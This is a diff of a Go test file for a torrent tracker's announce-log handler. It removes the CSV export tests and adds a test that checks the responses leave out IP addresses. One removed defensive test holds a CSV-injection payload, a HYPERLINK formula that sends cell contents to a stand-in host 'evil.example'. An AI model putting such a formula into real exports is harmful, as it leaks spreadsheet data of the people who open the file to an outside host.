@@ -2,12 +2,10 @@ package handler
 
 import (
 	"context"
-	"encoding/csv"
 	"encoding/json"
 	"errors"
 	"net/http"
 	"net/http/httptest"
-	"strings"
 	"testing"
 	"time"
 
@@ -18,19 +16,11 @@ import (
 // --- stubs ---
 
 type stubAnnounceEventRepo struct {
-	// events is the whole log, oldest first, as PageByUser would walk it.
+	// events is one page of the log, newest first, as ListByUser returns it.
 	events []repository.AnnounceEventWithTorrent
 	total  int64
 
 	listErr error
-	pageErr error
-	// pageErrAfter makes the export fail part-way: the first N pages succeed and
-	// the next returns pageErr. Zero means fail on the first call.
-	pageErrAfter int
-	pageCalls    int
-	// pageLimits records the limit of each PageByUser call so a test can prove the
-	// export pages rather than asking for everything at once.
-	pageLimits []int
 }
 
 func (s *stubAnnounceEventRepo) Create(context.Context, *model.AnnounceEvent) error { return nil }
@@ -40,26 +30,6 @@ func (s *stubAnnounceEventRepo) ListByUser(_ context.Context, _ int64, _, _ int)
 		return nil, 0, s.listErr
 	}
 	return s.events, s.total, nil
-}
-
-func (s *stubAnnounceEventRepo) PageByUser(_ context.Context, _ int64, afterID int64, limit int) ([]repository.AnnounceEventWithTorrent, error) {
-	s.pageCalls++
-	s.pageLimits = append(s.pageLimits, limit)
-	if s.pageErr != nil && s.pageCalls > s.pageErrAfter {
-		return nil, s.pageErr
-	}
-
-	var out []repository.AnnounceEventWithTorrent
-	for i := range s.events {
-		if s.events[i].ID <= afterID {
-			continue
-		}
-		out = append(out, s.events[i])
-		if len(out) == limit {
-			break
-		}
-	}
-	return out, nil
 }
 
 // Housekeeping belongs to the nightly worker. Nothing on an HTTP path may delete
@@ -102,7 +72,6 @@ func sampleAnnounceEvents() []repository.AnnounceEventWithTorrent {
 	first.UserID = 42
 	first.TorrentID = &torrentID
 	first.PeerID = []byte{0x2d, 0x71, 0x42, 0xff}
-	first.IP = "203.0.113.9"
 	first.Port = 6881
 	first.Event = "started"
 	first.Uploaded = 100
@@ -120,7 +89,6 @@ func sampleAnnounceEvents() []repository.AnnounceEventWithTorrent {
 	second.UserID = 42
 	second.TorrentID = nil
 	second.PeerID = []byte{0x00, 0x01}
-	second.IP = "203.0.113.9"
 	second.Port = 6881
 	second.Event = "announce"
 	second.Seeder = true
@@ -197,64 +165,6 @@ func TestAnnounceLog_OwnerSeesEventsAndMonthlyTotals(t *testing.T) {
 	}
 }
 
-// A torrent name is chosen by its uploader and lands in the export of everyone who
-// announced on it, staff included. Opened in a spreadsheet, a leading '=' is a
-// formula, not text.
-func TestAnnounceLogExport_NeutralisesSpreadsheetFormulas(t *testing.T) {
-	hostile := repository.AnnounceEventWithTorrent{
-		TorrentName: `=HYPERLINK("http://evil.example/?"&A1,"invoice")`,
-	}
-	hostile.ID = 1
-	hostile.Event = "started"
-	hostile.AnnouncedAt = time.Unix(1, 0).UTC()
-
-	events := &stubAnnounceEventRepo{events: []repository.AnnounceEventWithTorrent{hostile}, total: 1}
-	h := NewAnnounceLogHandler(events, &stubAnnounceRollupRepo{}, nil)
-
-	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
-	w := httptest.NewRecorder()
-	h.HandleExport(w, r)
-
-	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
-	if err != nil {
-		t.Fatalf("export is not valid CSV: %v", err)
-	}
-	if len(rows) != 2 {
-		t.Fatalf("expected a header and one row, got %d", len(rows))
-	}
-	name := rows[1][2]
-	if strings.HasPrefix(name, "=") {
-		t.Errorf("torrent name %q reaches the spreadsheet as a formula", name)
-	}
-	if !strings.HasPrefix(name, "'=") {
-		t.Errorf("torrent name = %q, want it prefixed with an apostrophe", name)
-	}
-	// Escaped, not mangled: the member's own data must still be readable.
-	if !strings.Contains(name, "evil.example") {
-		t.Errorf("escaping dropped part of the value: %q", name)
-	}
-}
-
-func TestCsvCell(t *testing.T) {
-	for _, tc := range []struct{ in, want string }{
-		{"", ""},
-		{"Some Release", "Some Release"},
-		{"=1+1", "'=1+1"},
-		{"+1", "'+1"},
-		{"-1", "'-1"},
-		{"@SUM(A1)", "'@SUM(A1)"},
-		{"\tlead", "'\tlead"},
-		{"\rlead", "'\rlead"},
-		// Only the leading character starts a formula; an equals sign inside a name
-		// is just a character and must survive untouched.
-		{"Release=Name", "Release=Name"},
-	} {
-		if got := csvCell(tc.in); got != tc.want {
-			t.Errorf("csvCell(%q) = %q, want %q", tc.in, got, tc.want)
-		}
-	}
-}
-
 func TestAnnounceLog_StaffMaySeeAnotherMember(t *testing.T) {
 	h := NewAnnounceLogHandler(&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{}, nil)
 
@@ -270,22 +180,12 @@ func TestAnnounceLog_StaffMaySeeAnotherMember(t *testing.T) {
 func TestAnnounceLog_OtherMemberForbidden(t *testing.T) {
 	h := NewAnnounceLogHandler(&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{}, nil)
 
-	for _, tc := range []struct {
-		name    string
-		handler func(http.ResponseWriter, *http.Request)
-	}{
-		{"list", h.HandleList},
-		{"export", h.HandleExport},
-	} {
-		t.Run(tc.name, func(t *testing.T) {
-			r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 43, false)
-			w := httptest.NewRecorder()
-			tc.handler(w, r)
+	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 43, false)
+	w := httptest.NewRecorder()
+	h.HandleList(w, r)
 
-			if w.Code != http.StatusForbidden {
-				t.Fatalf("expected 403 reading another member's log, got %d: %s", w.Code, w.Body.String())
-			}
-		})
+	if w.Code != http.StatusForbidden {
+		t.Fatalf("expected 403 reading another member's log, got %d: %s", w.Code, w.Body.String())
 	}
 }
 
@@ -349,129 +249,34 @@ func TestAnnounceLog_RepositoryErrors(t *testing.T) {
 	})
 }
 
-// --- export ---
-
-func TestAnnounceLogExport_WritesCSV(t *testing.T) {
+// The tracker stopped recording announce IPs in migration 080. Decoding into a
+// map rather than a struct is deliberate: a typed decode ignores fields it does
+// not know about, so it would pass just as happily if the handler started
+// serialising an address again.
+func TestAnnounceLog_ResponseCarriesNoIPAddress(t *testing.T) {
 	events := &stubAnnounceEventRepo{events: sampleAnnounceEvents(), total: 2}
 	h := NewAnnounceLogHandler(events, &stubAnnounceRollupRepo{}, nil)
 
 	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
 	w := httptest.NewRecorder()
-	h.HandleExport(w, r)
+	h.HandleList(w, r)
 
 	if w.Code != http.StatusOK {
-		t.Fatalf("expected 200, got %d", w.Code)
-	}
-	if ct := w.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
-		t.Errorf("expected a text/csv content type, got %q", ct)
-	}
-	if cd := w.Header().Get("Content-Disposition"); cd != `attachment; filename="announce-log-42.csv"` {
-		t.Errorf("unexpected Content-Disposition: %q", cd)
+		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
 	}
 
-	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
-	if err != nil {
-		t.Fatalf("export is not valid CSV: %v", err)
+	var body struct {
+		Events []map[string]json.RawMessage `json:"events"`
 	}
-	if len(rows) != 3 {
-		t.Fatalf("expected a header and 2 rows, got %d rows: %v", len(rows), rows)
+	if err := json.Unmarshal(w.Body.Bytes(), &body); err != nil {
+		t.Fatalf("decoding response: %v", err)
 	}
-	if rows[0][0] != "announced_at" || rows[0][6] != "peer_id" {
-		t.Errorf("unexpected header: %v", rows[0])
+	if len(body.Events) == 0 {
+		t.Fatal("expected the sample events to be returned")
 	}
-	if rows[1][1] != "7" || rows[1][2] != "Some Release" {
-		t.Errorf("unexpected first row: %v", rows[1])
-	}
-	if rows[1][6] != "2d7142ff" {
-		t.Errorf("expected hex peer_id, got %q", rows[1][6])
-	}
-	if rows[1][0] != "2026-07-01T12:00:00Z" {
-		t.Errorf("expected a UTC RFC3339 timestamp, got %q", rows[1][0])
-	}
-	// A deleted torrent leaves an empty id cell rather than a misleading 0, which
-	// would be a real torrent's id.
-	if rows[2][1] != "" {
-		t.Errorf("expected an empty torrent_id for a deleted torrent, got %q", rows[2][1])
-	}
-	if rows[2][13] != "true" {
-		t.Errorf("expected seeder=true on the second row, got %q", rows[2][13])
-	}
-}
-
-// The export walks the log by keyset. This proves it actually pages — a single
-// unbounded query would work for two rows and fall over on ninety days of them.
-func TestAnnounceLogExport_PagesUntilExhausted(t *testing.T) {
-	var log []repository.AnnounceEventWithTorrent
-	for i := 1; i <= announceLogExportPage*2+3; i++ {
-		e := repository.AnnounceEventWithTorrent{TorrentName: "t"}
-		e.ID = int64(i)
-		e.AnnouncedAt = time.Unix(int64(i), 0).UTC()
-		log = append(log, e)
-	}
-	events := &stubAnnounceEventRepo{events: log}
-	h := NewAnnounceLogHandler(events, &stubAnnounceRollupRepo{}, nil)
-
-	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
-	w := httptest.NewRecorder()
-	h.HandleExport(w, r)
-
-	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
-	if err != nil {
-		t.Fatalf("export is not valid CSV: %v", err)
-	}
-	if want := len(log) + 1; len(rows) != want {
-		t.Fatalf("expected %d rows including the header, got %d", want, len(rows))
-	}
-	// Three full-size pages: two that fill and one short page that ends the walk.
-	if events.pageCalls != 3 {
-		t.Errorf("expected 3 pages for %d rows, got %d", len(log), events.pageCalls)
-	}
-	for i, limit := range events.pageLimits {
-		if limit != announceLogExportPage {
-			t.Errorf("page %d asked for %d rows, want %d", i, limit, announceLogExportPage)
+	for i, e := range body.Events {
+		if _, ok := e["ip"]; ok {
+			t.Errorf("event %d serialises an ip field: %v", i, e)
 		}
-	}
-}
-
-// Headers are already sent when a page fails, so the failure cannot become a 500.
-// What must not happen is a silent success: the body has to stop where the data
-// stopped, so a short file is detectable by row count.
-func TestAnnounceLogExport_TruncatesOnRepositoryError(t *testing.T) {
-	var log []repository.AnnounceEventWithTorrent
-	for i := 1; i <= announceLogExportPage+5; i++ {
-		e := repository.AnnounceEventWithTorrent{TorrentName: "t"}
-		e.ID = int64(i)
-		e.AnnouncedAt = time.Unix(int64(i), 0).UTC()
-		log = append(log, e)
-	}
-	events := &stubAnnounceEventRepo{events: log, pageErr: errors.New("boom"), pageErrAfter: 1}
-	h := NewAnnounceLogHandler(events, &stubAnnounceRollupRepo{}, nil)
-
-	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
-	w := httptest.NewRecorder()
-	h.HandleExport(w, r)
-
-	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
-	if err != nil {
-		t.Fatalf("truncated export must still be parseable CSV: %v", err)
-	}
-	if want := announceLogExportPage + 1; len(rows) != want {
-		t.Fatalf("expected the first page plus a header (%d rows), got %d", want, len(rows))
-	}
-}
-
-func TestAnnounceLogExport_EmptyLogWritesHeaderOnly(t *testing.T) {
-	h := NewAnnounceLogHandler(&stubAnnounceEventRepo{}, &stubAnnounceRollupRepo{}, nil)
-
-	r := withAuth(withChiURLParam(httptest.NewRequest(http.MethodGet, "/", nil), "id", "42"), 42, false)
-	w := httptest.NewRecorder()
-	h.HandleExport(w, r)
-
-	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
-	if err != nil {
-		t.Fatalf("export is not valid CSV: %v", err)
-	}
-	if len(rows) != 1 {
-		t.Fatalf("expected a header row and nothing else, got %v", rows)
 	}
 }
